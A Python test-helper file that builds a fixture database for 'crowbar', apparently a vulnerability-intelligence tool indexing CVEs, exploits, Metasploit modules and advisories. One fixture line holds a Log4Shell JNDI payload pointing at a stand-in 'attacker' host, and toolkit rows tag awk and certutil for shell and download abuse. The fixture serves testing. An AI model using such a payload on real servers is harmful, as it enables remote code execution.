"""Shared helpers for the crowbar test suite."""
from __future__ import annotations

import json
import os
import pathlib
import sqlite3
import subprocess
import sys
import tempfile
import time

ROOT = pathlib.Path(__file__).resolve().parents[1]
HV = ROOT / "bin" / "crowbar"
# fixture indexes look old; never let a test start a real background update
os.environ["CROWBAR_NO_AUTO_UPDATE"] = "1"


def corpus_path() -> pathlib.Path:
    home = pathlib.Path(os.environ.get("CROWBAR_HOME") or ROOT)
    return home / "index" / "crowbar.db"


def corpus_available() -> bool:
    p = corpus_path()
    return p.exists() and p.stat().st_size > 1_000_000


def connect() -> sqlite3.Connection:
    con = sqlite3.connect(f"file:{corpus_path()}?mode=ro", uri=True)
    con.row_factory = sqlite3.Row
    return con


def rows(con: sqlite3.Connection, sql: str, params=()) -> list[dict]:
    return [dict(r) for r in con.execute(sql, params)]


def one(con: sqlite3.Connection, sql: str, params=()):
    r = con.execute(sql, params).fetchone()
    return r[0] if r else None


def run_hv(*args: str, home: str | None = None, timeout: int = 180):
    env = dict(os.environ)
    if home:
        env["CROWBAR_HOME"] = home
    return subprocess.run([sys.executable, "-m", "crowbar.cli", *args],
                          cwd=ROOT, capture_output=True, text=True,
                          env=env, timeout=timeout)


def run_cb_json(*args: str, home: str | None = None):
    p = run_hv(*args, "--json", home=home)
    if p.returncode != 0:
        raise AssertionError(f"hv {' '.join(args)} failed: {p.stderr.strip()[:500]}")
    return json.loads(p.stdout)


def make_fixture_db(path: pathlib.Path) -> pathlib.Path:
    """Small but complete DB: every table + every FTS index has rows."""
    from crowbar import indexer

    if path.exists():
        path.unlink()
    con = indexer.create(path)
    cves = [
        ("CVE-2021-44228", "2021-12-10", "2021-12-15", "Analyzed",
         "Apache Log4j2 JNDI remote code execution vulnerability", 10.0, "3.1",
         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "CRITICAL",
         1, 0.97, 99.9, 1, 1, 1, 2021),
        ("CVE-2017-0144", "2017-03-14", "2020-01-01", "Analyzed",
         "Microsoft SMBv1 remote code execution vulnerability", 8.1, "3.0",
         "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "HIGH",
         1, 0.94, 98.0, 1, 0, 1, 2017),
        ("CVE-2023-1111", "2023-03-01", "2023-03-02", "Analyzed",
         "nginx resolver off-by-one heap overwrite", 7.5, "3.1", "", "HIGH",
         0, 0.12, 80.0, 0, 0, 0, 2023),
        ("CVE-2024-2222", "2024-01-05", "2024-01-06", "Analyzed",
         "OpenSSH signal handler race condition", 8.1, "3.1", "", "HIGH",
         0, 0.31, 90.0, 0, 1, 0, 2024),
        ("CVE-2025-3333", "2025-02-02", "2025-02-03", "Analyzed",
         "iOS kernel type confusion privilege escalation", 7.8, "3.1", "", "HIGH",
         0, 0.05, 40.0, 0, 0, 0, 2025),
    ]
    con.executemany("INSERT INTO cve VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", cves)
    con.executemany("INSERT INTO cve_cwe VALUES (?,?)", [
        ("CVE-2021-44228", "CWE-502"), ("CVE-2017-0144", "CWE-20"),
        ("CVE-2023-1111", "CWE-787"), ("CVE-2024-2222", "CWE-362")])
    con.executemany("INSERT INTO cve_product VALUES (?,?,?)", [
        ("CVE-2021-44228", "apache", "log4j"), ("CVE-2017-0144", "microsoft", "smb"),
        ("CVE-2023-1111", "f5", "nginx"), ("CVE-2024-2222", "openbsd", "openssh"),
        ("CVE-2025-3333", "apple", "iphone_os")])
    con.executemany("INSERT INTO cpe_match VALUES (?,?,?,?,?,?,?,?,?)", [
        ("CVE-2021-44228", "a", "apache", "log4j", "*", "2.0", "", "2.15.0", ""),
        ("CVE-2017-0144", "a", "microsoft", "smb", "*", "", "", "1.0", ""),
        ("CVE-2023-1111", "a", "f5", "nginx", "*", "0.6.18", "", "1.20.1", ""),
        ("CVE-2024-2222", "a", "openbsd", "openssh", "*", "8.5", "", "9.8", ""),
        ("CVE-2025-3333", "o", "apple", "iphone_os", "18.2", "", "", "", "")])
    con.executemany("INSERT INTO cve_ref VALUES (?,?,?)", [
        ("CVE-2021-44228", "https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "Vendor Advisory")])
    con.executemany("INSERT INTO cve_exploit VALUES (?,?)", [
        ("CVE-2021-44228", "50592"), ("CVE-2017-0144", "1")])
    con.executemany("INSERT INTO cve_nuclei VALUES (?,?)", [
        ("CVE-2021-44228", "CVE-2021-44228"), ("CVE-2024-2222", "CVE-2024-2222")])
    con.executemany("INSERT INTO cve_msf VALUES (?,?)", [
        ("CVE-2017-0144", "modules/exploits/windows/smb/ms17_010_eternalblue")])
    con.execute("INSERT INTO kev VALUES (?,?,?,?,?,?,?,?,?,?,?)", (
        "CVE-2021-44228", "Apache", "log4j", "Apache Log4j2 RCE",
        "2021-12-10", "Known", "Apply updates", "2021-12-24", "JNDI injection", 0.97, 0.99))
    con.executemany("INSERT INTO exploit VALUES (" + ",".join("?" * 12) + ")", [
        ("50592", "exploits/multiple/webapps/50592.py",
         "Apache Log4j 2 - Remote Code Execution (RCE)", "2021-12-14", "test",
         "webapps", "multiple", 1, "CVE-2021-44228", "log4j,rce",
         "https://example.invalid/50592.py", ""),
        ("1", "exploits/windows/smb/1.py", "SMB remote exploit", "2017-03-14",
         "test", "remote", "windows", 0, "CVE-2017-0144", "smb",
         "https://example.invalid/1.py", "")])
    con.execute("INSERT INTO shellcode VALUES (?,?,?,?,?,?)", (
        "100", "shellcodes/linux/x86/100.c", "execve shellcode", "2010-01-01",
        "linux/x86", "https://example.invalid/100.c"))
    con.executemany("INSERT INTO nuclei VALUES (?,?,?,?,?,?,?,?)", [
        ("CVE-2021-44228", "Apache Log4j RCE", "critical", "cve,rce,log4j",
         "CVE-2021-44228", "http/cves/2021/CVE-2021-44228.yaml", "JNDI check", "http"),
        ("CVE-2024-2222", "OpenSSH race", "high", "cve,ssh", "CVE-2024-2222",
         "network/cves/2024/CVE-2024-2222.yaml", "signal race", "network")])
    con.executemany("INSERT INTO msf VALUES (?,?,?,?,?,?,?,?)", [
        ("modules/exploits/windows/smb/ms17_010_eternalblue", "exploits",
         "ms17_010_eternalblue", "windows", 1, "2017-03-14",
         "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption", "CVE-2017-0144"),
        ("modules/exploits/multi/http/log4shell", "exploits", "log4shell",
         "multi", 1, "2021-12-14", "Log4Shell RCE", "CVE-2021-44228")])
    con.executemany("INSERT INTO attack VALUES (?,?,?,?,?,?,?)", [
        ("T1059", "enterprise", "Command and Scripting Interpreter",
         "execution", "Linux,Windows,macOS", "Adversaries may abuse command interpreters",
         "https://attack.mitre.org/techniques/T1059"),
        ("T0800", "ics", "Activate Firmware Update Mode", "inhibit-response-function",
         "None", "Adversaries may activate firmware update mode", "")])
    con.executemany("INSERT INTO cwe VALUES (?,?,?,?,?)", [
        ("CWE-502", "Deserialization of Untrusted Data", "Base", "Stable",
         "The product deserializes untrusted data"),
        ("CWE-787", "Out-of-bounds Write", "Base", "Stable", "Write past end of buffer")])
    con.execute("INSERT INTO capec VALUES (?,?,?,?,?,?)", (
        "CAPEC-66", "SQL Injection", "High", "High", "CWE-89",
        "Attacker injects SQL via input fields"))
    con.executemany("INSERT INTO model VALUES (?,?,?,?,?,?,?,?,?,?,?,?)", [
        ("anthropic", "Anthropic", "claude-sonnet", "Claude Sonnet", 200000,
         64000, 3.0, 15.0, "2025-01-01", 1, 1, 1),
        ("openai", "OpenAI", "gpt-test", "GPT Test", 128000, 16384,
         1.0, 4.0, "2025-02-01", 1, 1, 1)])
    con.execute("INSERT INTO ssvc VALUES (?,?,?,?,?,?)", (
        "CVE-2021-44228", "active", "yes", "total", "2021-12-11", "cisa"))
    con.executemany("INSERT INTO advisory VALUES ('osv',?,?,?,?,?,?,?,?,?,?,?)", [
        ("GHSA-jfh8-c2jp-5v3q", "npm", "log4js", "CVE-2021-44228",
         "Log4j RCE in log4js", "critical", "2021-12-10T00:00:00Z",
         "2021-12-15T00:00:00Z", "https://osv.dev/vulnerability/GHSA-jfh8-c2jp-5v3q",
         "CVE-2021-44228,GHSA-jfh8-c2jp-5v3q", 1),
        ("PYSEC-2023-1", "PyPI", "examplepkg", "",
         "Prototype pollution in examplepkg", "high", "2023-01-01T00:00:00Z",
         "2023-01-02T00:00:00Z", "https://osv.dev/vulnerability/PYSEC-2023-1",
         "PYSEC-2023-1", 1)])
    con.executemany("INSERT INTO package_range VALUES (?,?,?,?,?,?,?)", [
        ("GHSA-jfh8-c2jp-5v3q", "npm", "log4js", "2.0.0", "2.15.0", "", ""),
        ("PYSEC-2023-1", "PyPI", "examplepkg", "0", "1.2.3", "", "")])
    con.executemany("INSERT INTO debian VALUES (?,?,?,?,?,?,?)", [
        ("log4j", "bookworm", "CVE-2021-44228", "resolved", "2.17.1-1", "high", "Log4j RCE"),
        ("openssh", "bookworm", "CVE-2024-2222", "open", "", "medium", "race")])
    con.executemany("INSERT INTO os_advisory VALUES (?,?,?,?,?,?,?,?,?,?,?)", [
        ("msrc", "CVE-2017-0144", "windows", "windows smb", "2017-Mar",
         "SMBv1 Remote Code Execution Vulnerability", "Critical", "RCE", "", "2017-03-14",
         "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-0144"),
        ("apple", "CVE-2025-3333", "ios", "ios 18.2 and ipados 18.2", "18.2",
         "iOS 18.2 and iPadOS 18.2", "", "", "", "02 Feb 2025",
         "https://support.apple.com/en-us/000000"),
        ("apple", "CVE-2024-2222", "macos", "macos sequoia 15.2", "15.2",
         "macOS Sequoia 15.2", "", "", "", "12 Dec 2024",
         "https://support.apple.com/en-us/000001")])
    con.executemany("INSERT INTO toolkit VALUES (?,?,?,?,?)", [
        ("gtfobins", "awk", "_gtfobins/awk", "AWK", "shell,file-read"),
        ("lolbas", "certutil", "yml/Certutil.yml", "Certutil", "download,decode"),
        ("payloads", "SQL Injection", "SQL Injection/README.md",
         "SQL Injection", "sqli")])
    con.executemany("INSERT INTO exploit_code_fts(exploit_id,path,content) VALUES (?,?,?)", [
        ("50592", "exploits/multiple/webapps/50592.py",
         "import requests\npayload = '${jndi:ldap://attacker/x}'\nrequests.get(url)"),
        ("1", "exploits/windows/smb/1.py",
         "socket connect 445 smb shellcode buffer overflow")])
    con.executemany("INSERT INTO cve_fts(id,description,products) VALUES (?,?,?)",
                    [(c[0], c[4], " ".join(c[0].split("-"))) for c in cves])
    con.executemany("INSERT INTO exploit_fts(id,description,tags,codes) VALUES (?,?,?,?)", [
        ("50592", "Apache Log4j 2 Remote Code Execution RCE", "log4j,rce", "CVE-2021-44228"),
        ("1", "SMB remote exploit", "smb", "CVE-2017-0144")])
    con.executemany("INSERT INTO nuclei_fts(id,name,tags,cve) VALUES (?,?,?,?)", [
        ("CVE-2021-44228", "Apache Log4j RCE", "cve,rce,log4j", "CVE-2021-44228"),
        ("CVE-2024-2222", "OpenSSH race", "cve,ssh", "CVE-2024-2222")])
    con.executemany("INSERT INTO model_fts(provider,id,name) VALUES (?,?,?)", [
        ("anthropic", "claude-sonnet", "Claude Sonnet"),
        ("openai", "gpt-test", "GPT Test")])
    con.executemany("INSERT INTO toolkit_fts(source,name,description,tags) VALUES (?,?,?,?)", [
        ("gtfobins", "awk", "AWK", "shell,file-read"),
        ("lolbas", "certutil", "Certutil", "download,decode"),
        ("payloads", "SQL Injection", "SQL Injection", "sqli")])
    con.executemany("INSERT INTO cve_meta(cve_id,published_year,cve_year,poc_count) "
                    "VALUES (?,?,?,?)", [
        ("CVE-2021-44228", 2021, 2021, 2), ("CVE-2017-0144", 2017, 2017, 1),
        ("CVE-2023-1111", 2023, 2023, 0), ("CVE-2024-2222", 2024, 2024, 0),
        ("CVE-2025-3333", 2025, 2025, 0)])
    con.executemany("INSERT INTO poc(source,cve_id,repo,url,stars,language) "
                    "VALUES (?,?,?,?,?,?)", [
        ("poc-in-github", "CVE-2021-44228", "example/log4shell",
         "https://github.com/example/log4shell", 100, "Java"),
        ("poc-in-github", "CVE-2017-0144", "example/eternalblue",
         "https://github.com/example/eternalblue", 50, "Python")])
    def ago(days):   # mentions are dated relative to now so `trending` windows stay stable
        return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - days * 86400))
    con.executemany("INSERT INTO mention VALUES (?,?,?,?,?,?)", [
        ("hn", "CVE-2021-44228", "https://news.ycombinator.com/item?id=1", "Log4Shell", ago(1), 900),
        ("mastodon", "CVE-2021-44228", "https://mastodon.social/@a/1", "patch log4j", ago(2), 12),
        ("euvd-exploited", "CVE-2021-44228", "https://euvd.enisa.europa.eu/vulnerability/EUVD-1",
         "EUVD-1 exploited", ago(3), None),
        ("oss-security", "CVE-2024-2222", "https://seclists.org/oss-sec/2024/q1/1", "regreSSHion",
         ago(1), None),
        ("hn", "CVE-2017-0144", "https://news.ycombinator.com/item?id=2", "EternalBlue", ago(40), 300)])
    con.executemany("INSERT INTO meta VALUES (?,?)", [
        ("schema", "3"), ("built_at", "2026-01-01T00:00:00Z"),
        ("updated_at", "2026-01-01T00:00:00Z")])
    con.commit()
    con.executescript(indexer.INDEXES)
    con.commit()
    con.close()
    return path


def make_fixture_home() -> tuple[pathlib.Path, pathlib.Path]:
    """Temp CROWBAR_HOME containing index/crowbar.db and empty data/."""
    home = pathlib.Path(tempfile.mkdtemp(prefix="hv-fixture-"))
    (home / "index").mkdir()
    (home / "data").mkdir()
    db = make_fixture_db(home / "index" / "crowbar.db")
    return home, db
